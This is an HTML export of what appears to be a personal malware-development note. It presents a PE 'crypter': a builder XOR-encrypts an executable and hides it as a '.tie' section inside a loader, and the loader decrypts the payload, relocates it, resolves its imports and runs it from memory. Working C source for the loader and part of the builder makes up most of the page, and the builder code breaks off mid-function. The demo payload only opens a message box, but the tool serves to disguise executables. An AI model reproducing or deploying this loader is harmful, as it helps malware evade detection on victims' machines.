<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Loader -> Attach section containing PE -> Decrypt .stub -> Map Locally</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Loader -&gt; Attach section containing PE -&gt; Decrypt .stub -&gt; Map Locally</h1></strong><br /><br />Just as the title sounds.<br />A builder encrypts the PE and attaches it as a section to a loader.<br />The loader then finds the section, decrypts the PE, and memory maps it locally into its own process and executes it.<br /><br /><a href=""><img src="images/1875-1.png" alt="images/1875-1.png" /></a><br /><br /><strong><h2>## Demo</h2></strong><br />This is my working folder.<br /><a href=""><img src="images/1875-2.png" alt="images/1875-2.png" /></a><br /><br />Here using the builder to create my encrypted executable - <code>crypted32.exe</code><br />I&#39;m encrypting a 32bit <code>calc.exe</code><br /><div class="codebox"><div class="codebox">builder.exe&nbsp;.\hello_messagebox.exe&nbsp;C:\Users\bob\source\malware_programs\crypter\stub_as_cryptedPE_MapLocally\loader\Release\loader.exe&nbsp;crypted32.exe</div></div><br /><br /><a href=""><img src="images/1875-3.png" alt="images/1875-3.png" /></a><br /><br />Here&#39;s my built <code>crypted32.exe</code> executable.<br />The <code>.tie</code> section stores the encrypted PE.<br /><a href=""><img src="images/1875-4.png" alt="images/1875-4.png" /></a><br /><br />And here&#39;s the <code>crypted32.exe</code> running.<br />It has performed relocations, imported extra functions, and has successfully ran hello_message.exe, which spawns a message box!<br /><a href=""><img src="images/1875-5.png" alt="images/1875-5.png" /></a><br /><br /><strong><h2>## Code</h2></strong><br />The code is pretty well commented. <br />Hopefully it&#39;s easily understood.<br /><br /><strong><h3>### Loader</h3></strong><br /><div class="codebox"><div class="codebox">/*<br />TODO:<br />-&nbsp;set&nbsp;memory&nbsp;protections&nbsp;on&nbsp;sections&nbsp;correctly<br />*/<br /><br />#define&nbsp;_CRT_SECURE_NO_WARNING<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;winternl.h&gt;<br /><br />#define&nbsp;SECTION_NAME&nbsp;&quot;.tie&quot;<br /><br />typedef&nbsp;struct&nbsp;BASE_RELOCATION_ENTRY<br />{<br />	USHORT&nbsp;Offset&nbsp;:&nbsp;12;<br />	USHORT&nbsp;Type&nbsp;:&nbsp;4;<br />}&nbsp;BASE_RELOCATION_ENTRY,&nbsp;*&nbsp;PBASE_RELOCATION_ENTRY;<br /><br />typedef&nbsp;NTSTATUS(__stdcall*&nbsp;t_NtUnmapViewOfSection)(HANDLE&nbsp;Processhandle,&nbsp;PVOID&nbsp;BaseAddress);<br />t_NtUnmapViewOfSection&nbsp;d_NtUnmapViewOfSection;<br /><br />/*<br />Find&nbsp;a&nbsp;section&nbsp;by&nbsp;name.<br />Return&nbsp;its&nbsp;address&nbsp;and&nbsp;size.<br />*/<br />void*&nbsp;FindSectionByName(void*&nbsp;pe_base,&nbsp;char*&nbsp;section_name,&nbsp;DWORD*&nbsp;section_size)<br />{<br />	void*&nbsp;section_addr&nbsp;=&nbsp;NULL;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_base;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)pe_base&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br /><br />	printf(&quot;[*]&nbsp;searching&nbsp;for&nbsp;%s&nbsp;section&nbsp;\n&quot;,&nbsp;section_name);<br /><br />	//&nbsp;Loop&nbsp;through&nbsp;sections&nbsp;until&nbsp;the&nbsp;desired&nbsp;section&nbsp;-&gt;&nbsp;save&nbsp;its&nbsp;address&nbsp;&amp;&nbsp;size&nbsp;and&nbsp;exit<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		printf(&quot;\t&nbsp;%s&nbsp;\n&quot;,&nbsp;section_header-&gt;Name);<br />		if&nbsp;(strcmp(section_header-&gt;Name,&nbsp;section_name)&nbsp;==&nbsp;0)<br />		{<br />			section_addr&nbsp;=&nbsp;(void*)((size_t)pe_base&nbsp;+&nbsp;section_header-&gt;VirtualAddress);<br />			*section_size&nbsp;=&nbsp;section_header-&gt;Misc.VirtualSize;<br />			printf(&quot;\t&nbsp;found&nbsp;%s&nbsp;@&nbsp;0x%p&nbsp;(size:&nbsp;%d)&nbsp;\n&quot;,&nbsp;section_name,&nbsp;section_addr,&nbsp;section_header-&gt;Misc.VirtualSize);<br />			break;<br />		}<br /><br />		section_header++;<br />	}<br /><br />	return&nbsp;section_addr;<br />}<br /><br />/*<br />Null&nbsp;preserving&nbsp;XOR&nbsp;function&nbsp;to&nbsp;encrypt/decrypt&nbsp;data.<br />*/<br />void&nbsp;xor_data(unsigned&nbsp;char*&nbsp;data,&nbsp;int&nbsp;data_size)<br />{<br />	char&nbsp;key[]&nbsp;=&nbsp;{&nbsp;&#39;t&#39;,&nbsp;&#39;i&#39;,&nbsp;&#39;e&#39;&nbsp;};<br />	int&nbsp;key_len&nbsp;=&nbsp;sizeof(key);<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;data_size;&nbsp;i++)<br />	{<br />		if&nbsp;((data[i]&nbsp;==&nbsp;0x00)&nbsp;||&nbsp;(data[i]&nbsp;==&nbsp;key[i&nbsp;%&nbsp;key_len]))<br />			continue;<br />		else<br />			data[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;key_len];<br />	}<br /><br />	return;<br />}<br /><br />/*<br />Convert&nbsp;VirtualAddress&nbsp;(address&nbsp;in&nbsp;memory)&nbsp;to&nbsp;raw&nbsp;address&nbsp;(address&nbsp;on&nbsp;disk).<br />Does&nbsp;so&nbsp;by&nbsp;finding&nbsp;which&nbsp;PE&nbsp;section&nbsp;your&nbsp;VirtualAddress&nbsp;is&nbsp;in,<br />subtracting&nbsp;the&nbsp;section&#39;s&nbsp;start&nbsp;address&nbsp;to&nbsp;find&nbsp;the&nbsp;relative&nbsp;virtual&nbsp;address,<br />and&nbsp;then&nbsp;adding&nbsp;the&nbsp;RVA&nbsp;to&nbsp;the&nbsp;start&nbsp;of&nbsp;the&nbsp;section&nbsp;on&nbsp;disk.<br />*/<br />DWORD&nbsp;va2raw(LPVOID&nbsp;file_buffer,&nbsp;DWORD&nbsp;va)<br />{<br />	DWORD&nbsp;rva&nbsp;=&nbsp;0;<br />	DWORD&nbsp;raw_address&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)file_buffer;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)file_buffer&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br /><br />	if&nbsp;(va&nbsp;&lt;&nbsp;section_header-&gt;PointerToRawData)<br />		return&nbsp;va;<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		DWORD&nbsp;section_start&nbsp;=&nbsp;section_header-&gt;VirtualAddress;<br />		DWORD&nbsp;section_end&nbsp;=&nbsp;section_header-&gt;VirtualAddress&nbsp;+&nbsp;section_header-&gt;SizeOfRawData;<br /><br />		//&nbsp;If&nbsp;the&nbsp;provided&nbsp;VA&nbsp;is&nbsp;within&nbsp;the&nbsp;bounds&nbsp;of&nbsp;this&nbsp;current&nbsp;section<br />		if&nbsp;(va&nbsp;&gt;=&nbsp;section_start&nbsp;&amp;&amp;&nbsp;va&nbsp;&lt;&nbsp;section_end)<br />		{<br />			rva&nbsp;=&nbsp;va&nbsp;-&nbsp;section_start;<br />			raw_address&nbsp;=&nbsp;section_header-&gt;PointerToRawData&nbsp;+&nbsp;rva;<br />			break;<br />		}<br /><br />		section_header&nbsp;+=&nbsp;1;<br />	}<br /><br />	return&nbsp;raw_address;<br />}<br /><br />/*<br />Loop&nbsp;through&nbsp;relocation&nbsp;table&nbsp;and&nbsp;perform&nbsp;base&nbsp;relocations.<br />Uses&nbsp;raw&nbsp;addresses!<br />`if`&nbsp;statements&nbsp;are&nbsp;used&nbsp;to&nbsp;make&nbsp;the&nbsp;code&nbsp;position&nbsp;independent<br />(using&nbsp;a&nbsp;switch&nbsp;statement&nbsp;assembles&nbsp;to&nbsp;jmp&nbsp;instructions,&nbsp;which<br />prevents&nbsp;the&nbsp;code&nbsp;from&nbsp;being&nbsp;position&nbsp;independent)<br />*/<br />BOOL&nbsp;RelocatePE(void*&nbsp;pe_buf,&nbsp;void*&nbsp;new_base)<br />{<br />	BOOL&nbsp;ok&nbsp;=&nbsp;TRUE;<br /><br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_buf;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((SIZE_T)dos_header&nbsp;+&nbsp;(SIZE_T)dos_header-&gt;e_lfanew);<br />	PIMAGE_BASE_RELOCATION&nbsp;reloc_table&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((size_t)pe_buf&nbsp;+&nbsp;va2raw(pe_buf,&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));<br />	PIMAGE_BASE_RELOCATION&nbsp;reloc_block&nbsp;=&nbsp;reloc_table;<br />	DWORD&nbsp;table_size&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br /><br />	size_t&nbsp;delta&nbsp;=&nbsp;(size_t)new_base&nbsp;-&nbsp;(size_t)pe_header-&gt;OptionalHeader.ImageBase;<br />	if&nbsp;(delta&nbsp;==&nbsp;0)<br />		return&nbsp;ok;<br /><br />	printf(&quot;\t&nbsp;original&nbsp;base:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(void*)pe_header-&gt;OptionalHeader.ImageBase);<br />	printf(&quot;\t&nbsp;target&nbsp;base:&nbsp;&nbsp;&nbsp;0x%p&nbsp;\n&quot;,&nbsp;new_base);<br />	printf(&quot;\t&nbsp;delta:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(void*)delta);<br /><br />	DWORD&nbsp;entries_in_block&nbsp;=&nbsp;0;<br />	DWORD&nbsp;table_position&nbsp;=&nbsp;0;<br />	PBASE_RELOCATION_ENTRY&nbsp;reloc_entry&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;Loop&nbsp;through&nbsp;blocks&nbsp;in&nbsp;relocation&nbsp;table<br />	while&nbsp;(table_position&nbsp;&lt;&nbsp;table_size)<br />	{<br />		entries_in_block&nbsp;=&nbsp;(reloc_block-&gt;SizeOfBlock&nbsp;-&nbsp;sizeof(IMAGE_BASE_RELOCATION))&nbsp;/&nbsp;sizeof(WORD);<br />		reloc_entry&nbsp;=&nbsp;(PBASE_RELOCATION_ENTRY)(reloc_block&nbsp;+&nbsp;1);<br /><br />		for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;entries_in_block;&nbsp;i++)<br />		{<br />			void*&nbsp;reloc_addr&nbsp;=&nbsp;(void*)((size_t)pe_buf&nbsp;+&nbsp;va2raw(pe_buf,&nbsp;reloc_block-&gt;VirtualAddress)&nbsp;+&nbsp;reloc_entry-&gt;Offset);<br /><br />			if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_HIGH)<br />				*(WORD*)((size_t)reloc_addr&nbsp;+&nbsp;0x2)&nbsp;+=&nbsp;HIWORD(delta);	//&nbsp;add&nbsp;higher&nbsp;16&nbsp;bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;higher&nbsp;16&nbsp;bits&nbsp;at&nbsp;relocation&nbsp;address<br />			else&nbsp;if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_LOW)<br />				*(WORD*)reloc_addr&nbsp;+=&nbsp;LOWORD(delta);					//&nbsp;add&nbsp;lower&nbsp;16&nbsp;bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;lower&nbsp;16&nbsp;bits&nbsp;at&nbsp;relocation&nbsp;address<br />			else&nbsp;if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_HIGHLOW)<br />				*(DWORD*)reloc_addr&nbsp;+=&nbsp;delta;							//&nbsp;add&nbsp;all&nbsp;32bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;the&nbsp;32bits&nbsp;at&nbsp;relocation&nbsp;address<br />			else&nbsp;if&nbsp;(reloc_entry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_DIR64)<br />				*(DWORD64*)reloc_addr&nbsp;+=&nbsp;delta;							//&nbsp;add&nbsp;all&nbsp;64bits&nbsp;of&nbsp;delta&nbsp;to&nbsp;the&nbsp;64bits&nbsp;at&nbsp;relocation&nbsp;address<br /><br />			reloc_entry&nbsp;+=&nbsp;1;<br />		}<br /><br />		//&nbsp;Advance&nbsp;to&nbsp;next&nbsp;block<br />		table_position&nbsp;+=&nbsp;reloc_block-&gt;SizeOfBlock;<br />		reloc_block&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((size_t)reloc_block&nbsp;+&nbsp;reloc_block-&gt;SizeOfBlock);<br />	}<br /><br />	printf(&quot;\t&nbsp;done!&nbsp;\n&quot;);<br />	return&nbsp;ok;<br />}<br /><br />BOOL&nbsp;ProcessImports(void*&nbsp;pe_base)<br />{<br />	BOOL&nbsp;ok&nbsp;=&nbsp;TRUE;<br /><br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_base;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)pe_base&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_IMPORT_DESCRIPTOR&nbsp;import_dir&nbsp;=&nbsp;(PIMAGE_IMPORT_DESCRIPTOR)((size_t)pe_base&nbsp;+&nbsp;va2raw(pe_base,&nbsp;pe_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress));<br />	PIMAGE_THUNK_DATA&nbsp;lookup_table&nbsp;=&nbsp;NULL;<br />	PIMAGE_THUNK_DATA&nbsp;addr_table&nbsp;=&nbsp;NULL;<br />	PIMAGE_IMPORT_BY_NAME&nbsp;import_name&nbsp;=&nbsp;NULL;<br /><br />	HMODULE&nbsp;h_dll&nbsp;=&nbsp;NULL;<br />	FARPROC&nbsp;import_addr&nbsp;=&nbsp;NULL;<br />	ULONGLONG&nbsp;import_ordinal&nbsp;=&nbsp;0;<br /><br />	//&nbsp;Loop&nbsp;through&nbsp;DLLs&nbsp;in&nbsp;import&nbsp;directory&nbsp;&amp;&nbsp;load&nbsp;them<br />	while&nbsp;(import_dir-&gt;Name&nbsp;!=&nbsp;0)<br />	{<br />		char*&nbsp;dll_name&nbsp;=&nbsp;(char*)((size_t)pe_base&nbsp;+&nbsp;va2raw(pe_base,&nbsp;import_dir-&gt;Name));<br />		h_dll&nbsp;=&nbsp;LoadLibraryA(dll_name);<br />		if&nbsp;(h_dll&nbsp;==&nbsp;NULL)<br />		{<br />			printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;load&nbsp;library:&nbsp;%s&nbsp;\n&quot;,&nbsp;dll_name);<br />			return&nbsp;FALSE;<br />		}<br /><br />		printf(&quot;\t&nbsp;[+]&nbsp;loaded&nbsp;%s&nbsp;\n&quot;,&nbsp;dll_name);<br /><br />		lookup_table&nbsp;=&nbsp;(PIMAGE_THUNK_DATA)((size_t)pe_base&nbsp;+&nbsp;va2raw(pe_base,&nbsp;import_dir-&gt;OriginalFirstThunk));<br />		addr_table&nbsp;=&nbsp;(PIMAGE_THUNK_DATA)((size_t)pe_base&nbsp;+&nbsp;va2raw(pe_base,&nbsp;import_dir-&gt;FirstThunk));<br /><br />		//&nbsp;Loop&nbsp;through&nbsp;functions&nbsp;in&nbsp;lookup&nbsp;table&nbsp;in&nbsp;DLL,&nbsp;get&nbsp;the&nbsp;function&#39;s&nbsp;address,&nbsp;and&nbsp;write&nbsp;address&nbsp;into&nbsp;the&nbsp;Import&nbsp;Address&nbsp;Table<br />		while&nbsp;(lookup_table-&gt;u1.AddressOfData&nbsp;!=&nbsp;0)<br />		{<br />			if&nbsp;(IMAGE_SNAP_BY_ORDINAL(lookup_table-&gt;u1.Ordinal))<br />			{<br />				import_ordinal&nbsp;=&nbsp;IMAGE_ORDINAL(lookup_table-&gt;u1.Ordinal);<br />				import_addr&nbsp;=&nbsp;GetProcAddress(h_dll,&nbsp;(LPCSTR)import_ordinal);<br /><br />				printf(&quot;\t\t&nbsp;[ordinal&nbsp;%lld]&nbsp;(orig)&nbsp;0x%llx&nbsp;&quot;,&nbsp;import_ordinal,&nbsp;addr_table-&gt;u1.Function);<br />				addr_table-&gt;u1.Function&nbsp;=&nbsp;(ULONGLONG)import_addr;<br />				printf(&quot;(new)&nbsp;0x%llx&nbsp;\n&quot;,&nbsp;addr_table-&gt;u1.Function);<br />			}<br />			else<br />			{<br />				import_name&nbsp;=&nbsp;(PIMAGE_IMPORT_BY_NAME)((size_t)pe_base&nbsp;+&nbsp;va2raw(pe_base,&nbsp;lookup_table-&gt;u1.AddressOfData));<br />				import_addr&nbsp;=&nbsp;GetProcAddress(h_dll,&nbsp;import_name-&gt;Name);<br /><br />				printf(&quot;\t\t&nbsp;[%s]&nbsp;orig:&nbsp;0x%llx&nbsp;&quot;,&nbsp;import_name-&gt;Name,&nbsp;addr_table-&gt;u1.Function);<br />				addr_table-&gt;u1.Function&nbsp;=&nbsp;(ULONGLONG)import_addr;<br />				printf(&quot;(new)&nbsp;0x%llx&nbsp;\n&quot;,&nbsp;addr_table-&gt;u1.Function);<br />			}<br /><br />			lookup_table++;<br />			addr_table++;<br />		}<br /><br />		import_dir++;<br />	}<br /><br />	return&nbsp;ok;<br />}<br /><br />void&nbsp;die(const&nbsp;char*&nbsp;fmt,&nbsp;...)<br />{<br />	va_list&nbsp;argp;<br />	va_start(argp,&nbsp;fmt);<br />	vfprintf(stderr,&nbsp;fmt,&nbsp;argp);<br />	va_end(argp);<br />	fputc(&#39;\n&#39;,&nbsp;stderr);<br />	exit(1);<br />}<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;b&nbsp;=&nbsp;FALSE;<br />	void*&nbsp;crypted_pe&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;pe_size&nbsp;=&nbsp;0;<br /><br />	printf(&quot;#&nbsp;SECTION&nbsp;CRYPTER&nbsp;-&nbsp;loader\n&quot;);<br />	printf(&quot;Imma&nbsp;extract&nbsp;your&nbsp;encrypted&nbsp;PE&nbsp;and&nbsp;execute&nbsp;it&nbsp;for&nbsp;you,&nbsp;gimme&nbsp;a&nbsp;sec&nbsp;would&nbsp;ya?&nbsp;\n\n&quot;);<br /><br />	crypted_pe&nbsp;=&nbsp;FindSectionByName(GetModuleHandleA(NULL),&nbsp;SECTION_NAME,&nbsp;&amp;pe_size);<br />	if&nbsp;(crypted_pe&nbsp;==&nbsp;NULL)<br />		die(&quot;[-]&nbsp;failed&nbsp;to&nbsp;find&nbsp;the&nbsp;%s&nbsp;section&nbsp;\n\tthis&nbsp;could&nbsp;be&nbsp;just&nbsp;the&nbsp;base&nbsp;file.&nbsp;\n\thave&nbsp;you&nbsp;built&nbsp;a&nbsp;crypted&nbsp;binary&nbsp;yet?&nbsp;\n&quot;,&nbsp;SECTION_NAME);<br /><br />	//&nbsp;Mark&nbsp;memory&nbsp;as&nbsp;r/w/x&nbsp;and&nbsp;decrypt&nbsp;data.<br />	DWORD&nbsp;old_protect&nbsp;=&nbsp;0;<br />	b&nbsp;=&nbsp;VirtualProtect(crypted_pe,&nbsp;pe_size,&nbsp;PAGE_EXECUTE_READWRITE,&nbsp;&amp;old_protect);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />		die(&quot;[-]&nbsp;failed&nbsp;to&nbsp;mark&nbsp;memory&nbsp;as&nbsp;executable:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />	<br />	printf(&quot;[+]&nbsp;marked&nbsp;memory&nbsp;as&nbsp;EXECUTE_READWRITE&nbsp;\n&quot;);<br />	xor_data(crypted_pe,&nbsp;pe_size);<br />	printf(&quot;[+]&nbsp;decrypted&nbsp;PE&nbsp;\n&quot;);<br /><br />	/*<br />	Execute&nbsp;PE&nbsp;by&nbsp;mapping&nbsp;locally.<br />	*/<br />	printf(&quot;[*]&nbsp;mapping&nbsp;locally...&nbsp;\n&quot;);<br />	<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)crypted_pe;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)crypted_pe&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br /><br />	//&nbsp;Allocate&nbsp;memory&nbsp;for&nbsp;PE<br />	void*&nbsp;mapped_pe&nbsp;=&nbsp;VirtualAlloc(NULL,&nbsp;pe_header-&gt;OptionalHeader.SizeOfImage,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />	if&nbsp;(mapped_pe&nbsp;==&nbsp;NULL)<br />		die(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;space&nbsp;for&nbsp;PE&nbsp;\n&quot;);<br />	printf(&quot;[+]&nbsp;allocated&nbsp;memory&nbsp;for&nbsp;PE&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;mapped_pe);<br /><br />	/*<br />	Relocate&nbsp;PE&nbsp;to&nbsp;new&nbsp;base,<br />	fix&nbsp;imports&nbsp;by&nbsp;changing&nbsp;source&nbsp;base&nbsp;to&nbsp;target&nbsp;process&nbsp;base,<br />	and&nbsp;match&nbsp;PE&nbsp;subsystem&nbsp;(get&nbsp;a&nbsp;0xc0000142&nbsp;if&nbsp;subsystems&nbsp;don&#39;t&nbsp;match)<br />	*/<br />	printf(&quot;[*]&nbsp;relocating&nbsp;PE&nbsp;\n&quot;);<br />	RelocatePE(crypted_pe,&nbsp;mapped_pe);<br />	pe_header-&gt;OptionalHeader.ImageBase&nbsp;=&nbsp;(size_t)mapped_pe;<br />	//pe_header-&gt;OptionalHeader.Subsystem&nbsp;=&nbsp;IMAGE_SUBSYSTEM_WINDOWS_GUI;<br />	printf(&quot;[*]&nbsp;importing&nbsp;functions&nbsp;\n&quot;);<br />	ProcessImports(crypted_pe);<br /><br />	//&nbsp;Write&nbsp;headers<br />	memcpy(mapped_pe,&nbsp;crypted_pe,&nbsp;pe_header-&gt;OptionalHeader.SizeOfHeaders);<br />	printf(&quot;[+]&nbsp;wrote&nbsp;headers&nbsp;to:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;mapped_pe);<br /><br />	//&nbsp;Write&nbsp;sections&nbsp;1&nbsp;by&nbsp;1<br />	printf(&quot;[*]&nbsp;writing&nbsp;sections&nbsp;\n&quot;);<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pe_header-&gt;FileHeader.NumberOfSections;&nbsp;i++)<br />	{<br />		void*&nbsp;section_addr&nbsp;=&nbsp;(void*)((size_t)crypted_pe&nbsp;+&nbsp;section-&gt;PointerToRawData);<br />		void*&nbsp;write_addr&nbsp;=&nbsp;(void*)((size_t)mapped_pe&nbsp;+&nbsp;section-&gt;VirtualAddress);<br />		memcpy(write_addr,&nbsp;section_addr,&nbsp;section-&gt;SizeOfRawData);<br /><br />		printf(&quot;\t&nbsp;+&nbsp;wrote&nbsp;%s&nbsp;to:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;section-&gt;Name,&nbsp;write_addr);<br />		section++;<br />	}<br /><br />	void*&nbsp;entrypoint&nbsp;=&nbsp;(void*)((size_t)mapped_pe&nbsp;+&nbsp;pe_header-&gt;OptionalHeader.AddressOfEntryPoint);<br />	printf(&quot;[*]&nbsp;entrypoint&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;entrypoint);<br />	FlushInstructionCache(NULL,&nbsp;entrypoint,&nbsp;0);<br />	((void(*)())entrypoint)();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### Builder</h3></strong><br /><div class="codebox"><div class="codebox">/*<br />#&nbsp;Loader<br />Open&nbsp;a&nbsp;PE&nbsp;file,&nbsp;encrypt&nbsp;it,&nbsp;and&nbsp;add&nbsp;a&nbsp;section&nbsp;to&nbsp;it.<br />Write&nbsp;out&nbsp;the&nbsp;modified&nbsp;PE&nbsp;to&nbsp;a&nbsp;new&nbsp;file.<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />#define&nbsp;SECTION_NAME&nbsp;&quot;.tie&quot;<br /><br />/*<br />Make&nbsp;sure&nbsp;to&nbsp;call&nbsp;free(file_buffer)&nbsp;after&nbsp;you&#39;re&nbsp;done.<br />*/<br />void*&nbsp;ReadFileIntoBuffer(char*&nbsp;file_name,&nbsp;OUT&nbsp;DWORD*&nbsp;file_buffer_size)<br />{<br />	void*&nbsp;file_buffer&nbsp;=&nbsp;NULL;<br />	BOOL&nbsp;b&nbsp;=&nbsp;TRUE;<br />	HANDLE&nbsp;h_file&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;file_size&nbsp;=&nbsp;0;<br /><br />	//&nbsp;Open&nbsp;target&nbsp;file<br />	h_file&nbsp;=&nbsp;CreateFileA(file_name,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_file&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;Get&nbsp;file&nbsp;size<br />	file_size&nbsp;=&nbsp;GetFileSize(h_file,&nbsp;NULL);<br />	(*file_buffer_size)&nbsp;=&nbsp;file_size;<br /><br />	//&nbsp;Create&nbsp;buffer&nbsp;to&nbsp;read&nbsp;file&nbsp;into<br />	file_buffer&nbsp;=&nbsp;malloc(file_size);<br /><br />	//&nbsp;Read&nbsp;file&nbsp;into&nbsp;buffer<br />	b&nbsp;=&nbsp;ReadFile(h_file,&nbsp;file_buffer,&nbsp;file_size,&nbsp;NULL,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;into&nbsp;buffer:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		free(file_buffer);<br />		goto&nbsp;cleanup;<br />	}<br /><br />cleanup:<br />	if&nbsp;(h_file)&nbsp;CloseHandle(h_file);<br /><br />	return&nbsp;file_buffer;<br />}<br /><br />/*<br />Null&nbsp;preserving&nbsp;XOR&nbsp;function&nbsp;to&nbsp;encrypt/decrypt&nbsp;bytes.<br />*/<br />void&nbsp;xor_bytes(unsigned&nbsp;char*&nbsp;data,&nbsp;int&nbsp;data_size)<br />{<br />	char&nbsp;key[]&nbsp;=&nbsp;{&nbsp;&#39;t&#39;,&nbsp;&#39;i&#39;,&nbsp;&#39;e&#39;&nbsp;};<br />	int&nbsp;key_len&nbsp;=&nbsp;sizeof(key);<br /><br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;data_size;&nbsp;i++)<br />	{<br />		if&nbsp;((data[i]&nbsp;==&nbsp;0x00)&nbsp;||&nbsp;(data[i]&nbsp;==&nbsp;key[i&nbsp;%&nbsp;key_len]))<br />			continue;<br />		else<br />			data[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;key_len];<br />	}<br /><br />	return;<br />}<br /><br />DWORD&nbsp;align(DWORD&nbsp;curr_value,&nbsp;DWORD&nbsp;align_value,&nbsp;size_t&nbsp;target_addr)<br />{<br />	if&nbsp;(!(curr_value&nbsp;%&nbsp;align_value))<br />		return&nbsp;target_addr&nbsp;+&nbsp;curr_value;<br /><br />	